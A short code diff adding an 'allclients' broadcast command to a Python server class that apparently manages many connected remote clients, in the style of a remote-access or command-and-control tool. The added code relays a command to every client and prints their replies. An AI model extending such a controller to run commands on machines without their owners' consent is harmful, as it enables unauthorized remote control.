@@ -196,6 +196,19 @@ class Allclients:
                 
         except Exception as e:
             return f"[-] File operation error: {str(e)}"
+        
+    
+    def all_clients_command(self, command: list):
+        responses = {}
+        for client_id, connection in self.clients.items():
+            try:
+                self.connect_send(connection, command)
+                response = self.connect_receive(connection)
+                responses[client_id] = response
+            except Exception as e:
+                responses[client_id] = f"Error: {str(e)}"
+        return responses
+
 
 
     def execute_cmd(self, cmd: list):
@@ -237,6 +250,16 @@ class Allclients:
                     result = self.manage_file_commands(cmd_parts)
                     print(result)
                     continue
+
+                elif base_cmd == "allclients":
+                    if len(cmd_parts) < 2:
+                        print("[-] Usage: allclients <command>")
+                        continue
+                    responses = self.all_clients_command(cmd_parts[1:])
+                    for client_id, response in responses.items():
+                        print(f"\n{client_id}:")
+                        print(response)
+
 
                 elif base_cmd == "exit":
                     print("[!] Shutting down server....")
